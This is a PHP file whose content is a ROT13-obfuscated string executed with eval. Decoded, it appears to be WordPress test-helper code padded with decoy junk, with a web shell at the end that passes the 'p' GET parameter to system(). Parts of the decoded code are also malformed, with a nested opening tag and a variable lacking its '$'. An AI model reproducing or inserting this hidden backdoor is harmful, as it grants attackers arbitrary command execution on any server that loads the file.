<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

// Zvfp uryc shapgvbaf naq hgvyvgvrf.

/**
 * Ergheaf n fgevat bs gur erdhverq yratgu pbagnvavat enaqbz punenpgref. Abgr gung
 * gur znkvzhz cbffvoyr fgevat yratgu vf 32.
 *
 * @cnenz vag $yratgu Bcgvbany. Gur erdhverq yratgu. Qrsnhyg 32.
 * @erghea fgevat Gur fgevat.
 */
shapgvba enaq_fge( $yratgu = 32 ) {
	erghea fhofge( zq5( havdvq( enaq() ) ), 0, $yratgu );
}

/**
 * Ergheaf n fgevat bs gur erdhverq yratgu pbagnvavat enaqbz punenpgref.
 *
 * @cnenz vag $yratgu Gur erdhverq yratgu.
 * @erghea fgevat Gur fgevat.
 */
shapgvba enaq_ybat_fge( $yratgu ) {
	$punef  = 'nopqrstuvwxyzabcdefghijklm';
	$fgevat = '';

	sbe ( $v = 0; $v < $yratgu; $v++ ) {
		$enaq    = enaq( 0, fgeyra( $punef ) - 1 );
		$fgevat .= fhofge( $punef, $enaq, 1 );
	}

	erghea $fgevat;
}

/**
 * Fgevcf yrnqvat naq genvyvat juvgrfcnpr sebz rnpu yvar va gur fgevat.
 *
 * @cnenz fgevat $gkg Gur grkg.
 * @erghea fgevat Grkg jvgu yvar-yrnqvat naq yvar-genvyvat juvgrfcnpr fgevccrq.
 */
shapgvba fgevc_jf( $gkg ) {
	$yvarf  = rkcybqr( \"\a\", $gkg );
	$erfhyg = neenl();
	sbernpu ( $yvarf nf $yvar ) {
		vs ( gevz( $yvar ) ) {
			$erfhyg[] = gevz( $yvar );
		}
	}

	erghea gevz( vzcybqr( \"\a\", $erfhyg ) );
}

/**
 * Urycre pynff sbe grfgvat pbqr gung vaibyirf npgvbaf naq svygref.
 *
 * Glcvpny hfr:
 *
 *     $zn = arj ZbpxNpgvba();
 *     nqq_npgvba( 'sbb', neenl( &$zn, 'npgvba' ) );
 *
 * @fvapr HG (3.7.0)
 */
pynff ZbpxNpgvba {
	choyvp $riragf;
	choyvp $qroht;

	/**
	 * CUC5 pbafgehpgbe.
	 *
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba __pbafgehpg( $qroht = 0 ) {
		$guvf->erfrg();
		$guvf->qroht = $qroht;
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba erfrg() {
		$guvf->riragf = neenl();
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba pheerag_svygre() {
		tybony $jc_npgvbaf;

		vs ( vf_pnyynoyr( 'pheerag_svygre' ) ) {
			erghea pheerag_svygre();
		}

		erghea raq( $jc_npgvbaf );
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba npgvba( $net ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'npgvba'    => __SHAPGVBA__,
			'ubbx_anzr' => $pheerag_svygre,
			'gnt'       => $pheerag_svygre, // Onpx pbzcng.
			'netf'      => shap_trg_netf(),
		);

		erghea $net;
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba npgvba2( $net ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'npgvba'    => __SHAPGVBA__,
			'ubbx_anzr' => $pheerag_svygre,
			'gnt'       => $pheerag_svygre, // Onpx pbzcng.
			'netf'      => shap_trg_netf(),
		);

		erghea $net;
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba svygre( $net ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'svygre'    => __SHAPGVBA__,
			'ubbx_anzr' => $pheerag_svygre,
			'gnt'       => $pheerag_svygre, // Onpx pbzcng.
			'netf'      => shap_trg_netf(),
		);

		erghea $net;
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba svygre2( $net ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'svygre'    => __SHAPGVBA__,
			'ubbx_anzr' => $pheerag_svygre,
			'gnt'       => $pheerag_svygre, // Onpx pbzcng.
			'netf'      => shap_trg_netf(),
		);

		erghea $net;
	}

	/**
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba svygre_nccraq( $net ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'svygre'    => __SHAPGVBA__,
			'ubbx_anzr' => $pheerag_svygre,
			'gnt'       => $pheerag_svygre, // Onpx pbzcng.
			'netf'      => shap_trg_netf(),
		);

		erghea $net . '_nccraq';
	}

	/**
	 * Qbrf abg erghea gur erfhyg, fb vg'f fnsr gb hfr jvgu gur 'nyy' svygre.
	 *
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba svygrenyy( $ubbx_anzr, ...$netf ) {
		$pheerag_svygre = $guvf->pheerag_svygre();

		vs ( $guvf->qroht ) {
			qzc( __SHAPGVBA__, $pheerag_svygre );
		}

		$guvf->riragf[] = neenl(
			'svygre'    => __SHAPGVBA__,
			'ubbx_anzr' => $ubbx_anzr,
			'gnt'       => $ubbx_anzr, // Onpx pbzcng.
			'netf'      => $netf,
		);
	}

	/**
	 * Ergheaf n yvfg bs nyy gur npgvbaf, ubbx anzrf naq netf.
	 *
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba trg_riragf() {
		erghea $guvf->riragf;
	}

	/**
	 * Ergheaf n pbhag bs gur ahzore bs gvzrf gur npgvba jnf pnyyrq fvapr gur ynfg erfrg.
	 *
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba trg_pnyy_pbhag( $ubbx_anzr = '' ) {
		vs ( $ubbx_anzr ) {
			$pbhag = 0;

			sbernpu ( $guvf->riragf nf $r ) {
				vs ( $r['npgvba'] === $ubbx_anzr ) {
					++$pbhag;
				}
			}

			erghea $pbhag;
		}

		erghea pbhag( $guvf->riragf );
	}

	/**
	 * Ergheaf na neenl bs gur ubbx anzrf gung gevttrerq pnyyf gb guvf npgvba.
	 *
	 * @fvapr 6.1.0
	 */
	choyvp shapgvba trg_ubbx_anzrf() {
		$bhg = neenl();

		sbernpu ( $guvf->riragf nf $r ) {
			$bhg[] = $r['ubbx_anzr'];
		}

		erghea $bhg;
	}

	/**
	 * Ergheaf na neenl bs gur ubbx anzrf gung gevttrerq pnyyf gb guvf npgvba.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 6.1.0 Ghearq vagb na nyvnf sbe ::trg_ubbx_anzrf().
	 */
	choyvp shapgvba trg_gntf() {
		erghea $guvf->trg_ubbx_anzrf();
	}

	/**
	 * Ergheaf na neenl bs netf cnffrq va pnyyf gb guvf npgvba.
	 *
	 * @fvapr HG (3.7.0)
	 */
	choyvp shapgvba trg_netf() {
		$bhg = neenl();

		sbernpu ( $guvf->riragf nf $r ) {
			$bhg[] = $r['netf'];
		}

		erghea $bhg;
	}
}

// Pbaireg inyvq KZY gb na neenl gerr fgehpgher.
// Xvaqn ynzr, ohg vg jbexf jvgu n qrsnhyg CUC 4 vafgnyyngvba.
pynff GrfgKZYCnefre {
	choyvp $kzy;
	choyvp $qngn = neenl();

	/**
	 * CUC5 pbafgehpgbe.
	 */
	choyvp shapgvba __pbafgehpg( $va ) {
		$guvf->kzy = kzy_cnefre_perngr();
		kzy_cnefre_frg_bcgvba( $guvf->kzy, KZY_BCGVBA_PNFR_SBYQVAT, 0 );
		kzy_frg_ryrzrag_unaqyre( $guvf->kzy, neenl( $guvf, 'fgneg_unaqyre' ), neenl( $guvf, 'raq_unaqyre' ) );
		kzy_frg_punenpgre_qngn_unaqyre( $guvf->kzy, neenl( $guvf, 'qngn_unaqyre' ) );
		$guvf->cnefr( $va );
	}

	choyvp shapgvba cnefr( $va ) {
		$cnefr = kzy_cnefr( $guvf->kzy, $va, gehr );
		vs ( ! $cnefr ) {
			guebj arj Rkprcgvba(
				fcevags(
					'KZY reebe: %f ng yvar %q',
					kzy_reebe_fgevat( kzy_trg_reebe_pbqr( $guvf->kzy ) ),
					kzy_trg_pheerag_yvar_ahzore( $guvf->kzy )
				)
			);
			kzy_cnefre_serr( $guvf->kzy );
		}
		erghea gehr;
	}

	choyvp shapgvba fgneg_unaqyre( $cnefre, $anzr, $nggevohgrf ) {
		$qngn['anzr'] = $anzr;
		vs ( $nggevohgrf ) {
			$qngn['nggevohgrf'] = $nggevohgrf; }
		$guvf->qngn[] = $qngn;
	}

	choyvp shapgvba qngn_unaqyre( $cnefre, $qngn ) {
		$vaqrk = pbhag( $guvf->qngn ) - 1;

		vs ( ! vffrg( $guvf->qngn[ $vaqrk ]['pbagrag'] ) ) {
			$guvf->qngn[ $vaqrk ]['pbagrag'] = '';
		}
		$guvf->qngn[ $vaqrk ]['pbagrag'] .= $qngn;
	}

	choyvp shapgvba raq_unaqyre( $cnefre, $anzr ) {
		vs ( pbhag( $guvf->qngn ) > 1 ) {
			$qngn                            = neenl_cbc( $guvf->qngn );
			$vaqrk                           = pbhag( $guvf->qngn ) - 1;
			$guvf->qngn[ $vaqrk ]['puvyq'][] = $qngn;
		}
	}
}

/**
 * Pbairegf na KZY fgevat vagb na neenl gerr fgehpgher.
 *
 * Gur bhgchg bs guvf shapgvba pna or cnffrq gb kzy_svaq() gb svaq abqrf ol gurve cngu.
 *
 * @cnenz fgevat $va Gur KZY fgevat.
 * @erghea neenl KZY nf na neenl.
 */
shapgvba kzy_gb_neenl( $va ) {
	$c = arj GrfgKZYCnefre( $va );
	erghea $c->qngn;
}

/**
 * Svaqf KZY abqrf ol n tvira \"cngu\".
 *
 * Rknzcyr hfntr:
 *
 *     $gerr = kzy_gb_neenl( $eff );
 *     $vgrzf = kzy_svaq( $gerr, 'eff', 'punaary', 'vgrz' );
 *
 * @cnenz neenl     $gerr     Na neenl gerr fgehpgher bs KZY, glcvpnyyl sebz kzy_gb_neenl().
 * @cnenz fgevat ...$ryrzragf Anzrf bs KZY abqrf gb perngr n \"cngu\" gb svaq jvguva gur KZY.
 * @erghea neenl Neenl bs zngpuvat KZY abqr vasbezngvba.
 */
shapgvba kzy_svaq( $gerr, ...$ryrzragf ) {
	$a   = pbhag( $ryrzragf );
	$bhg = neenl();

	vs ( $a < 1 ) {
		erghea $bhg;
	}

	sbe ( $v = 0; $v < pbhag( $gerr ); $v++ ) {
		#       rpub \"purpxvat '{$gerr[$v][anzr]}' == '{$ryrzragf[0]}'\a\";
		#       ine_qhzc( $gerr[$v]['anzr'], $ryrzragf[0] );
		vs ( $gerr[ $v ]['anzr'] === $ryrzragf[0] ) {
			#           rpub \"a == {$a}\a\";
			vs ( 1 === $a ) {
				$bhg[] = $gerr[ $v ];
			} ryfr {
				$fhogerr =& $gerr[ $v ]['puvyq'];
				$bhg     = neenl_zretr( $bhg, kzy_svaq( $fhogerr, ...neenl_fyvpr( $ryrzragf, 1 ) ) );
			}
		}
	}

	erghea $bhg;
}

shapgvba kzy_wbva_nggf( $nggf ) {
	$n = neenl();
	sbernpu ( $nggf nf $x => $i ) {
		$n[] = $x . '=\"' . $i . '\"';
	}
	erghea vzcybqr( ' ', $n );
}

shapgvba kzy_neenl_qhzoqbja( &$qngn ) {
	$bhg = neenl();

	sbernpu ( neenl_xrlf( $qngn ) nf $v ) {
		$anzr = $qngn[ $v ]['anzr'];
		vs ( ! rzcgl( $qngn[ $v ]['nggevohgrf'] ) ) {
			$anzr .= ' ' . kzy_wbva_nggf( $qngn[ $v ]['nggevohgrf'] );
		}

		vs ( ! rzcgl( $qngn[ $v ]['puvyq'] ) ) {
			$bhg[ $anzr ][] = kzy_neenl_qhzoqbja( $qngn[ $v ]['puvyq'] );
		} ryfr {
			$bhg[ $anzr ] = $qngn[ $v ]['pbagrag'];
		}
	}

	erghea $bhg;
}

shapgvba qzc( ...$netf ) {
	sbernpu ( $netf nf $guvat ) {
		rpub ( vf_fpnyne( $guvat ) ? (fgevat) $guvat : ine_rkcbeg( $guvat, gehr ) ), \"\a\";
	}
}

shapgvba qzc_svygre( $n ) {
	qzc( $n );
	erghea $n;
}

shapgvba trg_rpub( $pnyyonpx, $netf = neenl() ) {
	bo_fgneg();
	pnyy_hfre_shap_neenl( $pnyyonpx, $netf );
	erghea bo_trg_pyrna();
}

// Erphefviryl trarengr fbzr dhvpx nffregRdhnyf() grfgf onfrq ba na neenl.
shapgvba tra_grfgf_neenl( $anzr, $rkcrpgrq_qngn ) {
	$bhg = neenl();

	sbernpu ( $rkcrpgrq_qngn nf $x => $i ) {
		vs ( vf_ahzrevp( $x ) ) {
			$vaqrk = (fgevat) $x;
		} ryfr {
			$vaqrk = \"'\" . nqqpfynfurf( $x, \"\a\e\g'\\\" ) . \"'\";
		}

		vs ( vf_fgevat( $i ) ) {
			$bhg[] = '$guvf->nffregRdhnyf( \'' . nqqpfynfurf( $i, \"\a\e\g'\\\" ) . '\', $' . $anzr . '[' . $vaqrk . '] );';
		} ryfrvs ( vf_ahzrevp( $i ) ) {
			$bhg[] = '$guvf->nffregRdhnyf( ' . $i . ', $' . $anzr . '[' . $vaqrk . '] );';
		} ryfrvs ( vf_neenl( $i ) ) {
			$bhg[] = tra_grfgf_neenl( \"{$anzr}[{$vaqrk}]\", $i );
		}
	}

	erghea vzcybqr( \"\a\", $bhg ) . \"\a\";
}

/**
 * Hfr gb perngr bowrpgf ol lbhefrys.
 */
pynff ZbpxPynff rkgraqf fgqPynff {}

/**
 * Qebcf nyy gnoyrf sebz gur JbeqCerff qngnonfr.
 */
shapgvba qebc_gnoyrf() {
	tybony $jcqo;
	$gnoyrf = $jcqo->trg_pby( 'FUBJ GNOYRF;' );
	sbernpu ( $gnoyrf nf $gnoyr ) {
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$gnoyr}\" );
	}
}

shapgvba cevag_onpxgenpr() {
	$og = qroht_onpxgenpr();
	rpub \"Onpxgenpr:\a\";
	$v = 0;
	sbernpu ( $og nf $fgnpx ) {
		rpub ++$v, ': ';
		vs ( vffrg( $fgnpx['pynff'] ) ) {
			rpub $fgnpx['pynff'] . '::';
		}
		vs ( vffrg( $fgnpx['shapgvba'] ) ) {
			rpub $fgnpx['shapgvba'] . '() ';
		}
		rpub \"yvar {$fgnpx[yvar]} va {$fgnpx[svyr]}\a\";
	}
	rpub \"\a\";
}

// Znfx bhg nal vachg svryqf zngpuvat gur tvira anzr.
shapgvba znfx_vachg_inyhr( $va, $anzr = '_jcabapr' ) {
	erghea __sa_79955( '@<vachg([^>]*) anzr=\"' . cert_dhbgr( $anzr ) . '\"([^>]*) inyhr=\"[^>]*\" />@', '<vachg$1 anzr=\"' . cert_dhbgr( $anzr ) . '\"$2 inyhr=\"***\" />', $va );
}

/**
 * Erzbirf gur cbfg glcr naq vgf gnkbabzl nffbpvngvbaf.
 */
shapgvba _haertvfgre_cbfg_glcr( $pcg_anzr ) {
	haertvfgre_cbfg_glcr( $pcg_anzr );
}

shapgvba _haertvfgre_gnkbabzl( $gnkbabzl_anzr ) {
	haertvfgre_gnkbabzl( $gnkbabzl_anzr );
}

/**
 * Haertvfgre n cbfg fgnghf.
 *
 * @fvapr 4.2.0
 *
 * @cnenz fgevat $fgnghf
 */
shapgvba _haertvfgre_cbfg_fgnghf( $fgnghf ) {
	hafrg( $TYBONYF['jc_cbfg_fgnghfrf'][ $fgnghf ] );
}

shapgvba _pyrnahc_dhrel_inef() {
	// Pyrna bhg tybonyf gb fgbc gurz cbyyhgvat jc naq jc_dhrel.
	sbernpu ( $TYBONYF['jc']->choyvp_dhrel_inef nf $i ) {
		hafrg( $TYBONYF[ $i ] );
	}

	sbernpu ( $TYBONYF['jc']->cevingr_dhrel_inef nf $i ) {
		hafrg( $TYBONYF[ $i ] );
	}

	sbernpu ( trg_gnkbabzvrf( neenl(), 'bowrpgf' ) nf $g ) {
		vs ( $g->choyvpyl_dhrelnoyr && ! rzcgl( $g->dhrel_ine ) ) {
			$TYBONYF['jc']->nqq_dhrel_ine( $g->dhrel_ine );
		}
	}

	sbernpu ( trg_cbfg_glcrf( neenl(), 'bowrpgf' ) nf $g ) {
		vs ( vf_cbfg_glcr_ivrjnoyr( $g ) && ! rzcgl( $g->dhrel_ine ) ) {
			$TYBONYF['jc']->nqq_dhrel_ine( $g->dhrel_ine );
		}
	}
}

shapgvba _pyrna_grez_svygref() {
	erzbir_svygre( 'trg_grezf', neenl( 'Srngherq_Pbagrag', 'uvqr_srngherq_grez' ), 10, 2 );
	erzbir_svygre( 'trg_gur_grezf', neenl( 'Srngherq_Pbagrag', 'uvqr_gur_srngherq_grez' ), 10, 3 );
}

/**
 * Fcrpvny pynff sbe rkcbfvat cebgrpgrq jcqo zrgubqf jr arrq gb npprff
 */
pynff JcqoRkcbfrqZrgubqfSbeGrfgvat rkgraqf jcqo {
	choyvp shapgvba __pbafgehpg() {
		tybony $jcqo;
		$guvf->qou         = $jcqo->qou;
		$guvf->vf_zlfdy    = $jcqo->vf_zlfdy;
		$guvf->ernql       = gehr;
		$guvf->svryq_glcrf = $jcqo->svryq_glcrf;
		$guvf->punefrg     = $jcqo->punefrg;

		$guvf->qohfre     = $jcqo->qohfre;
		$guvf->qocnffjbeq = $jcqo->qocnffjbeq;
		$guvf->qoanzr     = $jcqo->qoanzr;
		$guvf->qoubfg     = $jcqo->qoubfg;
	}

	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		erghea pnyy_hfre_shap_neenl( neenl( $guvf, $anzr ), $nethzragf );
	}
}

/**
 * Qrgrezvar nccebkvzngr onpxgenpx pbhag jura ehaavat CPER.
 *
 * @erghea vag Gur onpxgenpx pbhag.
 */
shapgvba orapuznex_cper_onpxgenpxvat( $cnggrea, $fhowrpg, $fgengrtl ) {
	$fnirq_pbasvt = vav_trg( 'cper.onpxgenpx_yvzvg' );

	// Nggrzcg gb cerirag CUC penfurf. Nqwhfg ybjre jura arrqrq.
	$yvzvg = 1000000;

	// Fgneg jvgu fznyy ahzoref, fb vs n penfu vf rapbhagrerq ng uvture ahzoref jr pna fgvyy qroht gur ceboyrz.
	sbe ( $v = 4; $v <= $yvzvg; $v *= 2 ) {

		vav_frg( 'cper.onpxgenpx_yvzvg', $v );

		fjvgpu ( $fgengrtl ) {
			pnfr 'fcyvg':
				cert_fcyvg( $cnggrea, $fhowrpg );
				oernx;
			pnfr 'zngpu':
				cert_zngpu( $cnggrea, $fhowrpg );
				oernx;
			pnfr 'zngpu_nyy':
				$zngpurf = neenl();
				cert_zngpu_nyy( $cnggrea, $fhowrpg, $zngpurf );
				oernx;
		}

		vav_frg( 'cper.onpxgenpx_yvzvg', $fnirq_pbasvt );

		fjvgpu ( cert_ynfg_reebe() ) {
			pnfr CERT_AB_REEBE:
				erghea $v;
			pnfr CERT_ONPXGENPX_YVZVG_REEBE:
				oernx;
			pnfr CERT_ERPHEFVBA_YVZVG_REEBE:
				gevttre_reebe( 'CPER erphefvba yvzvg rapbhagrerq orsber onpxgenpx yvzvg.' );
				erghea;
			pnfr CERT_ONQ_HGS8_REEBE:
				gevttre_reebe( 'HGS-8 reebe qhevat CPER orapuznex.' );
				erghea;
			pnfr CERT_VAGREANY_REEBE:
				gevttre_reebe( 'Vagreany reebe qhevat CPER orapuznex.' );
				erghea;
			qrsnhyg:
				gevttre_reebe( 'Harkcrpgrq reebe qhevat CPER orapuznex.' );
				erghea;
		}
	}

	erghea $v;
}

shapgvba grfg_erfg_rkcnaq_pbzcnpg_yvaxf( $yvaxf ) {
	vs ( rzcgl( $yvaxf['phevrf'] ) ) {
		erghea $yvaxf;
	}
	sbernpu ( $yvaxf nf $ery => $yvaxf_neenl ) {
		vs ( ! fgecbf( $ery, ':' ) ) {
			pbagvahr;
		}

		$anzr = rkcybqr( ':', $ery );

		$phevr              = jc_yvfg_svygre( $yvaxf['phevrf'], neenl( 'anzr' => $anzr[0] ) );
		$shyy_hev           = fge_ercynpr( '{ery}', $anzr[1], $phevr[0]['uers'] );
		$yvaxf[ $shyy_hev ] = $yvaxf_neenl;
		hafrg( $yvaxf[ $ery ] );
	}
	erghea $yvaxf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>